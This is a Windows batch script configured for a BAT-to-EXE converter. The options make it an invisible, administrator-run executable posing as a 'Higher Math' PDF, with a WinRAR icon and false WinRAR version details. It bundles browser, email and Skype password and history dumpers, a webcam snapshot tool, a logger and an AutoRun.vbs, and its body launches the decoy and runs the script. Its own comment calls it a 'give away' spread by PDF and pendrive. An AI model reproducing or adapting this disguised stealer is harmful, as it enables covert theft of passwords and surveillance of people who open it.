@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=C:\Users\Shakil-PC\Desktop\pdf\pdf\Higher Math 1st and 2nd.exe
REM BFCPEICON=C:\FFOutput\winrar.ico
REM BFCPEICONINDEX=4
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=0
REM BFCPEADMINEXE=1
REM BFCPEINVISEXE=1
REM BFCPEVERINCLUDE=1
REM BFCPEVERVERSION=7.0.1.1
REM BFCPEVERPRODUCT=WinRAR archiver
REM BFCPEVERDESC=Compressed - WinRAR
REM BFCPEVERCOMPANY=WinRAR 
REM BFCPEVERCOPYRIGHT=Copyright Info - @ WinRAR 
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\AutoRun.vbs
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\facebook.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\folder.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\Higher Math 1st and 2nd.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\instagram.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\Pendrive.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\a310logger.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowserAddonsView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\ChromeHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\ChromePass.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\iehv.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\IEpassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\mailpv.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\MyLastSearch.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\nircmd.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\OperaPassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\PasswordFox.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\SafariHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\SkypeLogView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\TaskSchedulerView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\UninstallView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\WebBrowserPassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\WebCamImageSave.exe
REM BFCPEOPTIONEND
@ECHO ON
@echo off
:%SystemRoot%\explorer.exe "%cd%"
::timeout 2 > NUL

:: cd /D C:\Users\Public\Licence\Extension    (don't use it on pdf embed file)

:: this is give away or pdf file with - pdf, pendrive, autorun



pushd %~dp0







Start "" "%MYFILES%\Higher Math 1st and 2nd.exe"
cscript %MYFILES%\AutoRun.vbs

exit
